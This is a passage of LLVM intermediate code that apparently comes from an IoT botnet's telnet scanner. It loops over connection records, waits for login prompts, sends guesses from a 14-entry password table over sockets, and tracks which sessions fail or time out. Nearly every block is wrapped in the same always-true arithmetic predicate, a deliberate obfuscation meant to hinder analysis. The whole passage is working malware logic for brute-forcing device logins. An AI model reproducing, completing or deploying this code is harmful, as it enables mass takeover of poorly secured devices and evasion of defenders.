  br label %1844

; <label>:860:                                    ; preds = %837
  %861 = load i32, i32* @x.63
  %862 = load i32, i32* @y.64
  %863 = sub i32 %861, 1
  %864 = mul i32 %861, %863
  %865 = urem i32 %864, 2
  %866 = icmp eq i32 %865, 0
  %867 = icmp slt i32 %862, 10
  %868 = or i1 %866, %867
  br i1 %868, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %860
  %869 = load i32, i32* %4, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 2
  store i8 4, i8* %872, align 8
  %873 = load i32, i32* @x.63
  %874 = load i32, i32* @y.64
  %875 = sub i32 %873, 1
  %876 = mul i32 %873, %875
  %877 = urem i32 %876, 2
  %878 = icmp eq i32 %877, 0
  %879 = icmp slt i32 %874, 10
  %880 = or i1 %878, %879
  br i1 %880, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %1843

; <label>:881:                                    ; preds = %originalBBpart219
  %882 = load i32, i32* %4, align 4
  %883 = sext i32 %882 to i64
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 6
  %886 = load i32, i32* %885, align 4
  %887 = icmp eq i32 %886, 0
  br i1 %887, label %888, label %910

; <label>:888:                                    ; preds = %881
  %889 = load i32, i32* @x.63
  %890 = load i32, i32* @y.64
  %891 = sub i32 %889, 1
  %892 = mul i32 %889, %891
  %893 = urem i32 %892, 2
  %894 = icmp eq i32 %893, 0
  %895 = icmp slt i32 %890, 10
  %896 = or i1 %894, %895
  br i1 %896, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %888
  %897 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %898 = load i32, i32* %4, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 6
  store i32 %897, i32* %901, align 4
  %902 = load i32, i32* @x.63
  %903 = load i32, i32* @y.64
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %910

; <label>:910:                                    ; preds = %originalBBpart295, %881
  %911 = load i32, i32* @x.63
  %912 = load i32, i32* @y.64
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %910
  %919 = load i32, i32* %4, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 0
  %923 = load i32, i32* %922, align 16
  %924 = load i32, i32* %4, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 8
  %928 = load i8*, i8** %927, align 8
  %929 = load i32, i32* %4, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 7
  %933 = load i16, i16* %932, align 16
  %934 = zext i16 %933 to i32
  %935 = call i32 @readUntil(i32 %923, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %928, i32 1024, i32 %934)
  %936 = icmp ne i32 %935, 0
  %937 = load i32, i32* @x.63
  %938 = load i32, i32* @y.64
  %939 = sub i32 %937, 1
  %940 = mul i32 %937, %939
  %941 = urem i32 %940, 2
  %942 = icmp eq i32 %941, 0
  %943 = icmp slt i32 %938, 10
  %944 = or i1 %942, %943
  br i1 %944, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %936, label %945, label %1009

; <label>:945:                                    ; preds = %originalBBpart299
  %946 = load i32, i32* @x.63
  %947 = load i32, i32* @y.64
  %948 = sub i32 %946, 1
  %949 = mul i32 %946, %948
  %950 = urem i32 %949, 2
  %951 = icmp eq i32 %950, 0
  %952 = icmp slt i32 %947, 10
  %953 = or i1 %951, %952
  br i1 %953, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %945
  %954 = load i32, i32* %4, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 6
  store i32 0, i32* %957, align 4
  %958 = load i32, i32* %4, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 7
  store i16 0, i16* %961, align 16
  %962 = load i32, i32* %4, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 8
  %966 = load i8*, i8** %965, align 8
  %967 = call i8* @strstr(i8* %966, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0)) #10
  %968 = icmp ne i8* %967, null
  %969 = load i32, i32* @x.63
  %970 = load i32, i32* @y.64
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %968, label %977, label %982

; <label>:977:                                    ; preds = %originalBBpart2103
  %978 = load i32, i32* %4, align 4
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 2
  store i8 5, i8* %981, align 8
  br label %1003

; <label>:982:                                    ; preds = %originalBBpart2103
  %983 = load i32, i32* @x.63
  %984 = load i32, i32* @y.64
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %982
  %991 = load i32, i32* %4, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 2
  store i8 100, i8* %994, align 8
  %995 = load i32, i32* @x.63
  %996 = load i32, i32* @y.64
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %1003

; <label>:1003:                                   ; preds = %originalBBpart2107, %977
  %1004 = load i32, i32* %4, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 8
  %1008 = load i8*, i8** %1007, align 8
  call void @llvm.memset.p0i8.i64(i8* %1008, i8 0, i64 1024, i32 1, i1 false)
  br label %1844

; <label>:1009:                                   ; preds = %originalBBpart299
  %1010 = load i32, i32* %4, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 8
  %1014 = load i8*, i8** %1013, align 8
  %1015 = call i8* @strstr(i8* %1014, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %1016 = icmp ne i8* %1015, null
  br i1 %1016, label %1017, label %1048

; <label>:1017:                                   ; preds = %1009
  %1018 = load i32, i32* @x.63
  %1019 = load i32, i32* @y.64
  %1020 = sub i32 %1018, 1
  %1021 = mul i32 %1018, %1020
  %1022 = urem i32 %1021, 2
  %1023 = icmp eq i32 %1022, 0
  %1024 = icmp slt i32 %1019, 10
  %1025 = or i1 %1023, %1024
  br i1 %1025, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %1017
  %1026 = load i32, i32* %4, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 0
  %1030 = load i32, i32* %1029, align 16
  %1031 = call i32 @sclose(i32 %1030)
  %1032 = load i32, i32* %4, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 2
  store i8 0, i8* %1035, align 8
  %1036 = load i32, i32* %4, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 3
  store i8 0, i8* %1039, align 1
  %1040 = load i32, i32* @x.63
  %1041 = load i32, i32* @y.64
  %1042 = sub i32 %1040, 1
  %1043 = mul i32 %1040, %1042
  %1044 = urem i32 %1043, 2
  %1045 = icmp eq i32 %1044, 0
  %1046 = icmp slt i32 %1041, 10
  %1047 = or i1 %1045, %1046
  br i1 %1047, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %1844

; <label>:1048:                                   ; preds = %1009
  %1049 = load i32, i32* %4, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 8
  %1053 = load i8*, i8** %1052, align 8
  %1054 = call i64 @strlen(i8* %1053) #10
  %1055 = trunc i64 %1054 to i16
  %1056 = load i32, i32* %4, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 7
  store i16 %1055, i16* %1059, align 16
  br label %1060

; <label>:1060:                                   ; preds = %1048
  %1061 = load i32, i32* @x.63
  %1062 = load i32, i32* @y.64
  %1063 = sub i32 %1061, 1
  %1064 = mul i32 %1061, %1063
  %1065 = urem i32 %1064, 2
  %1066 = icmp eq i32 %1065, 0
  %1067 = icmp slt i32 %1062, 10
  %1068 = or i1 %1066, %1067
  br i1 %1068, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %1060
  %1069 = load i32, i32* %4, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 6
  %1073 = load i32, i32* %1072, align 4
  %1074 = add i32 %1073, 8
  %1075 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1076 = icmp ult i32 %1074, %1075
  %1077 = load i32, i32* @x.63
  %1078 = load i32, i32* @y.64
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBBpart2124, label %originalBB113alteredBB

originalBBpart2124:                               ; preds = %originalBB113
  br i1 %1076, label %1085, label %1100

; <label>:1085:                                   ; preds = %originalBBpart2124
  %1086 = load i32, i32* %4, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = load i32, i32* %1089, align 16
  %1091 = call i32 @sclose(i32 %1090)
  %1092 = load i32, i32* %4, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 2
  store i8 0, i8* %1095, align 8
  %1096 = load i32, i32* %4, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 3
  store i8 1, i8* %1099, align 1
  br label %1100

; <label>:1100:                                   ; preds = %1085, %originalBBpart2124
  %1101 = load i32, i32* @x.63
  %1102 = load i32, i32* @y.64
  %1103 = sub i32 %1101, 1
  %1104 = mul i32 %1101, %1103
  %1105 = urem i32 %1104, 2
  %1106 = icmp eq i32 %1105, 0
  %1107 = icmp slt i32 %1102, 10
  %1108 = or i1 %1106, %1107
  br i1 %1108, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1100
  %1109 = load i32, i32* @x.63
  %1110 = load i32, i32* @y.64
  %1111 = sub i32 %1109, 1
  %1112 = mul i32 %1109, %1111
  %1113 = urem i32 %1112, 2
  %1114 = icmp eq i32 %1113, 0
  %1115 = icmp slt i32 %1110, 10
  %1116 = or i1 %1114, %1115
  br i1 %1116, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1843

; <label>:1117:                                   ; preds = %originalBBpart219
  %1118 = load i32, i32* %4, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 0
  %1122 = load i32, i32* %1121, align 16
  %1123 = load i32, i32* %4, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 5
  %1127 = load i8, i8* %1126, align 1
  %1128 = zext i8 %1127 to i64
  %1129 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1128
  %1130 = load i8*, i8** %1129, align 8
  %1131 = load i32, i32* %4, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 5
  %1135 = load i8, i8* %1134, align 1
  %1136 = zext i8 %1135 to i64
  %1137 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1136
  %1138 = load i8*, i8** %1137, align 8
  %1139 = call i64 @strlen(i8* %1138) #10
  %1140 = call i64 @send(i32 %1122, i8* %1130, i64 %1139, i32 16384)
  %1141 = icmp slt i64 %1140, 0
  br i1 %1141, label %1142, label %1157

; <label>:1142:                                   ; preds = %1117
  %1143 = load i32, i32* %4, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1144
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1145, i32 0, i32 0
  %1147 = load i32, i32* %1146, align 16
  %1148 = call i32 @sclose(i32 %1147)
  %1149 = load i32, i32* %4, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 2
  store i8 0, i8* %1152, align 8
  %1153 = load i32, i32* %4, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 3
  store i8 1, i8* %1156, align 1
  br label %1844

; <label>:1157:                                   ; preds = %1117
  %1158 = load i32, i32* @x.63
  %1159 = load i32, i32* @y.64
  %1160 = sub i32 %1158, 1
  %1161 = mul i32 %1158, %1160
  %1162 = urem i32 %1161, 2
  %1163 = icmp eq i32 %1162, 0
  %1164 = icmp slt i32 %1159, 10
  %1165 = or i1 %1163, %1164
  br i1 %1165, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1157
  %1166 = load i32, i32* %4, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 0
  %1170 = load i32, i32* %1169, align 16
  %1171 = call i64 @send(i32 %1170, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %1172 = icmp slt i64 %1171, 0
  %1173 = load i32, i32* @x.63
  %1174 = load i32, i32* @y.64
  %1175 = sub i32 %1173, 1
  %1176 = mul i32 %1173, %1175
  %1177 = urem i32 %1176, 2
  %1178 = icmp eq i32 %1177, 0
  %1179 = icmp slt i32 %1174, 10
  %1180 = or i1 %1178, %1179
  br i1 %1180, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1172, label %1181, label %1212

; <label>:1181:                                   ; preds = %originalBBpart2132
  %1182 = load i32, i32* @x.63
  %1183 = load i32, i32* @y.64
  %1184 = sub i32 %1182, 1
  %1185 = mul i32 %1182, %1184
  %1186 = urem i32 %1185, 2
  %1187 = icmp eq i32 %1186, 0
  %1188 = icmp slt i32 %1183, 10
  %1189 = or i1 %1187, %1188
  br i1 %1189, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1181
  %1190 = load i32, i32* %4, align 4
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 0
  %1194 = load i32, i32* %1193, align 16
  %1195 = call i32 @sclose(i32 %1194)
  %1196 = load i32, i32* %4, align 4
  %1197 = sext i32 %1196 to i64
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1197
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1198, i32 0, i32 2
  store i8 0, i8* %1199, align 8
  %1200 = load i32, i32* %4, align 4
  %1201 = sext i32 %1200 to i64
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1201
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1202, i32 0, i32 3
  store i8 1, i8* %1203, align 1
  %1204 = load i32, i32* @x.63
  %1205 = load i32, i32* @y.64
  %1206 = sub i32 %1204, 1
  %1207 = mul i32 %1204, %1206
  %1208 = urem i32 %1207, 2
  %1209 = icmp eq i32 %1208, 0
  %1210 = icmp slt i32 %1205, 10
  %1211 = or i1 %1209, %1210
  br i1 %1211, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1844

; <label>:1212:                                   ; preds = %originalBBpart2132
  %1213 = load i32, i32* %4, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 2
  store i8 6, i8* %1216, align 8
  br label %1843

; <label>:1217:                                   ; preds = %originalBBpart219
  %1218 = load i32, i32* %4, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 6
  %1222 = load i32, i32* %1221, align 4
  %1223 = icmp eq i32 %1222, 0
  br i1 %1223, label %1224, label %1230

; <label>:1224:                                   ; preds = %1217
  %1225 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1226 = load i32, i32* %4, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 6
  store i32 %1225, i32* %1229, align 4
  br label %1230

; <label>:1230:                                   ; preds = %1224, %1217
  %1231 = load i32, i32* %4, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 0
  %1235 = load i32, i32* %1234, align 16
  %1236 = load i32, i32* %4, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 8
  %1240 = load i8*, i8** %1239, align 8
  %1241 = load i32, i32* %4, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 7
  %1245 = load i16, i16* %1244, align 16
  %1246 = zext i16 %1245 to i32
  %1247 = call i32 @readUntil(i32 %1235, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1240, i32 1024, i32 %1246)
  %1248 = icmp ne i32 %1247, 0
  br i1 %1248, label %1249, label %1372

; <label>:1249:                                   ; preds = %1230
  %1250 = load i32, i32* @x.63
  %1251 = load i32, i32* @y.64
  %1252 = sub i32 %1250, 1
  %1253 = mul i32 %1250, %1252
  %1254 = urem i32 %1253, 2
  %1255 = icmp eq i32 %1254, 0
  %1256 = icmp slt i32 %1251, 10
  %1257 = or i1 %1255, %1256
  br i1 %1257, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1249
  %1258 = load i32, i32* %4, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 6
  store i32 0, i32* %1261, align 4
  %1262 = load i32, i32* %4, align 4
  %1263 = sext i32 %1262 to i64
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 7
  store i16 0, i16* %1265, align 16
  %1266 = load i32, i32* %4, align 4
  %1267 = sext i32 %1266 to i64
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1268, i32 0, i32 8
  %1270 = load i8*, i8** %1269, align 8
  %1271 = call i8* @strstr(i8* %1270, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %1272 = icmp ne i8* %1271, null
  %1273 = load i32, i32* @x.63
  %1274 = load i32, i32* @y.64
  %1275 = sub i32 %1273, 1
  %1276 = mul i32 %1273, %1275
  %1277 = urem i32 %1276, 2
  %1278 = icmp eq i32 %1277, 0
  %1279 = icmp slt i32 %1274, 10
  %1280 = or i1 %1278, %1279
  br i1 %1280, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1272, label %1281, label %1301

; <label>:1281:                                   ; preds = %originalBBpart2140
  %1282 = load i32, i32* %4, align 4
  %1283 = sext i32 %1282 to i64
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1283
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1284, i32 0, i32 8
  %1286 = load i8*, i8** %1285, align 8
  call void @llvm.memset.p0i8.i64(i8* %1286, i8 0, i64 1024, i32 1, i1 false)
  %1287 = load i32, i32* %4, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1288
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1289, i32 0, i32 0
  %1291 = load i32, i32* %1290, align 16
  %1292 = call i32 @sclose(i32 %1291)
  %1293 = load i32, i32* %4, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 2
  store i8 0, i8* %1296, align 8
  %1297 = load i32, i32* %4, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 3
  store i8 0, i8* %1300, align 1
  br label %1844

; <label>:1301:                                   ; preds = %originalBBpart2140
  %1302 = load i32, i32* %4, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1303
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1304, i32 0, i32 8
  %1306 = load i8*, i8** %1305, align 8
  %1307 = call i32 @matchPrompt(i8* %1306)
  %1308 = icmp ne i32 %1307, 0
  br i1 %1308, label %1345, label %1309

; <label>:1309:                                   ; preds = %1301
  %1310 = load i32, i32* @x.63
  %1311 = load i32, i32* @y.64
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1309
  %1318 = load i32, i32* %4, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 8
  %1322 = load i8*, i8** %1321, align 8
  call void @llvm.memset.p0i8.i64(i8* %1322, i8 0, i64 1024, i32 1, i1 false)
  %1323 = load i32, i32* %4, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1324
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1325, i32 0, i32 0
  %1327 = load i32, i32* %1326, align 16
  %1328 = call i32 @sclose(i32 %1327)
  %1329 = load i32, i32* %4, align 4
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1330
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1331, i32 0, i32 2
  store i8 0, i8* %1332, align 8
  %1333 = load i32, i32* %4, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 3
  store i8 1, i8* %1336, align 1
  %1337 = load i32, i32* @x.63
  %1338 = load i32, i32* @y.64
  %1339 = sub i32 %1337, 1
  %1340 = mul i32 %1337, %1339
  %1341 = urem i32 %1340, 2
  %1342 = icmp eq i32 %1341, 0
  %1343 = icmp slt i32 %1338, 10
  %1344 = or i1 %1342, %1343
  br i1 %1344, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1844

; <label>:1345:                                   ; preds = %1301
  %1346 = load i32, i32* @x.63
  %1347 = load i32, i32* @y.64
  %1348 = sub i32 %1346, 1
  %1349 = mul i32 %1346, %1348
  %1350 = urem i32 %1349, 2
  %1351 = icmp eq i32 %1350, 0
  %1352 = icmp slt i32 %1347, 10
